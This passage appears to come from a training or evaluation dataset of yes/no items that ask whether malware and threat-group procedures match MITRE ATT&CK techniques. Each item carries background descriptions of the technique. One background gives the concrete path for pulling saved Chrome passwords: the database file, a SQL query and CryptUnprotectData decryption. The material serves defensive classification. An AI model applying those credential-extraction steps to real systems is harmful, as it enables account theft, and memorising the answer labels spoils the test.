      "question": "Is procedure Mispadu checks and will terminate execution if the compromised system\u2019s language ID is not Spanish or Portuguese. a type of technique Virtualization/Sandbox Evasion: System Checks",
      "yes/no": "No.\nThe provided context is related to System Location Discovery: System Language Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Mispadu can steal credentials from Google Chrome. a type of technique Credentials from Password Stores: Credentials from Web Browsers.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Credentials from Password Stores: Credentials from Web Browsers: Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim\u2019s cached logon credentials as the decryption key.\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
      "question": "Is procedure Mispadu can steal credentials from Google Chrome. a type of technique Credentials from Password Stores: Credentials from Web Browsers",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration. a type of technique Archive Collected Data: Archive via Custom Method.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Archive Collected Data: Archive via Custom Method: An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",
      "question": "Is procedure InvisiMole uses a variation of the XOR cipher to encrypt files before exfiltration. a type of technique Archive Collected Data: Archive via Custom Method",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending <code>.locked</code> to the filename. a type of technique Gather Victim Identity Information: Email Addresses.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Data Encrypted for Impact",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Data Encrypted for Impact: Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\").\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted.",
      "question": "Is procedure BitPaymer can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending <code>.locked</code> to the filename. a type of technique Gather Victim Identity Information: Email Addresses",
      "yes/no": "No.\nThe provided context is correlated with Data Encrypted for Impact",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure FlawedAmmyy can collect keyboard events. a type of technique Data Staged: Local Data Staging.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with Input Capture: Keylogging",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Input Capture: Keylogging: Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes. Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike Credential API Hooking, this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.",
      "question": "Is procedure FlawedAmmyy can collect keyboard events. a type of technique Data Staged: Local Data Staging",
      "yes/no": "No.\nThe provided context is correlated with Input Capture: Keylogging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Ramsay has been executed through malicious e-mail attachments.  related to technique Develop Capabilities: Malware",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious File: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "question": "Is procedure Ramsay has been executed through malicious e-mail attachments.  related to technique Develop Capabilities: Malware",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure NanHaiShu executes additional Jscript code on the victim's machine. a type of technique Active Scanning: Vulnerability Scanning.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: JavaScript: Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.\n\nJScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.\n\nJavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple\u2019s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple\u2019s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple\u2019s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and AppleScript. Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.\n\nAdversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.",
      "question": "Is procedure NanHaiShu executes additional Jscript code on the victim's machine. a type of technique Active Scanning: Vulnerability Scanning",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Native API: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools..\nAnswer in Yes or No.\n\nQuestion: Is procedure Chrommme can use Windows API including `WinExec` for execution. a type of technique Web Service: Dead Drop Resolver",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Native API: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "question": "Is procedure Chrommme can use Windows API including `WinExec` for execution. a type of technique Web Service: Dead Drop Resolver",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. a type of technique Exploitation for Client Execution",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exploitation for Client Execution: Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\n### Browser-based Exploitation\n\nWeb browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\n### Office Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\n### Common Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",
      "question": "Is procedure SpeakUp attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. a type of technique Exploitation for Client Execution",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure StreamEx has the ability to enumerate system information. a type of technique Brute Force: Credential Stuffing.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to System Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure StreamEx has the ability to enumerate system information. a type of technique Brute Force: Credential Stuffing",
      "yes/no": "No.\nThe provided context is related to System Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure Nomadic Octopus used <code>cmd.exe /c</code> within a malicious macro. a type of technique Data Manipulation: Stored Data Manipulation.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is related to Command and Scripting Interpreter: Windows Command Shell",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Command and Scripting Interpreter: Windows Command Shell: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "question": "Is procedure Nomadic Octopus used <code>cmd.exe /c</code> within a malicious macro. a type of technique Data Manipulation: Stored Data Manipulation",
      "yes/no": "No.\nThe provided context is related to Command and Scripting Interpreter: Windows Command Shell",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Web Service: Dead Drop Resolver: Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)..\nQ: Is procedure Grandoreiro can obtain C2 information from Google Docs. a type of technique Lateral Tool Transfer.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe correct answer is Web Service: Dead Drop Resolver",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Web Service: Dead Drop Resolver: Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",
      "question": "Is procedure Grandoreiro can obtain C2 information from Google Docs. a type of technique Lateral Tool Transfer",
      "yes/no": "No.\nThe correct answer is Web Service: Dead Drop Resolver",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Masquerading: Masquerade Task or Service: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate..\nQ: Is procedure Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service. a type of technique Masquerading: Masquerade Task or Service.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Masquerading: Masquerade Task or Service: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.\n\nTasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.",
      "question": "Is procedure Some Volgmer variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service. a type of technique Masquerading: Masquerade Task or Service",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine..\nAnswer in Yes or No.\n\nQuestion: Is procedure Diavol can collect the computer name and OS version from the system. a type of technique Query Registry",
    "context": "",
    "output": "No.\nThe correct answer is System Information Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "System Information Discovery: An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. <code>show version</code>). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
      "question": "Is procedure Diavol can collect the computer name and OS version from the system. a type of technique Query Registry",
      "yes/no": "No.\nThe correct answer is System Information Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background Clipboard Data: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents..\nQ: Is procedure Mispadu has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host. a type of technique Clipboard Data.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Clipboard Data: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.",
      "question": "Is procedure Mispadu has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host. a type of technique Clipboard Data",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Wizard Spider has exfiltrated stolen victim data to various cloud storage providers. a type of technique Obfuscated Files or Information: Steganography",
    "context": "",
    "output": "No.\nThe provided context is correlated with Exfiltration Over Web Service: Exfiltration to Cloud Storage",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exfiltration Over Web Service: Exfiltration to Cloud Storage: Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.",
      "question": "Is procedure Wizard Spider has exfiltrated stolen victim data to various cloud storage providers. a type of technique Obfuscated Files or Information: Steganography",
      "yes/no": "No.\nThe provided context is correlated with Exfiltration Over Web Service: Exfiltration to Cloud Storage",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host.  related to technique System Binary Proxy Execution: Mshta",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Exploitation for Privilege Escalation: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
      "question": "Is procedure APT29 has exploited CVE-2021-36934 to escalate privileges on a compromised host.  related to technique System Binary Proxy Execution: Mshta",
      "yes/no": "No",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Q: Is procedure APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails. a type of technique Command and Scripting Interpreter: Python.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "No.\nThe provided context is correlated with User Execution: Malicious Link",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "question": "Is procedure APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails. a type of technique Command and Scripting Interpreter: Python",
      "yes/no": "No.\nThe provided context is correlated with User Execution: Malicious Link",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Background User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File..\nQ: Is procedure APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders. a type of technique User Execution: Malicious Link.\n\nProvide your answer in Yes or No.",
    "context": "",
    "output": "Yes",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "User Execution: Malicious Link: An adversary may rely upon a user clicking a malicious link in order to gain execution. Users may be subjected to social engineering to get them to click on a link that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Link. Clicking on a link may also lead to other execution techniques such as exploitation of a browser or application vulnerability via Exploitation for Client Execution. Links may also lead users to download files that require execution via Malicious File.",
      "question": "Is procedure APT28 has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders. a type of technique User Execution: Malicious Link",
      "yes/no": "Yes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure Clop can use code signing to evade detection.  related to technique Unsecured Credentials: Cloud Instance Metadata API",
    "context": "",
    "output": "No.\nThe correct answer is Subvert Trust Controls: Code Signing",
    "category": "MitreFlan",
    "instruction_type": "mitre_yes_no_background_procedure",
    "parsed_raw_data": {
      "background": "Subvert Trust Controls: Code Signing: Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with.  The certificates used during an operation may be created, acquired, or stolen by the adversary.   Unlike Invalid Code Signature, this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. \n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system.",
      "question": "Is procedure Clop can use code signing to evade detection.  related to technique Unsecured Credentials: Cloud Instance Metadata API",
      "yes/no": "No.\nThe correct answer is Subvert Trust Controls: Code Signing",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_yes_no_background_procedure"
    }
  },
  {
    "instruction": "Answer in Yes or No.\n\nQuestion: Is procedure SombRAT can store harvested data in a custom database under the %TEMP% directory.  related to technique Exploitation for Privilege Escalation",
    "context": "",
    "output": "No",
    "category": "MitreFlan",
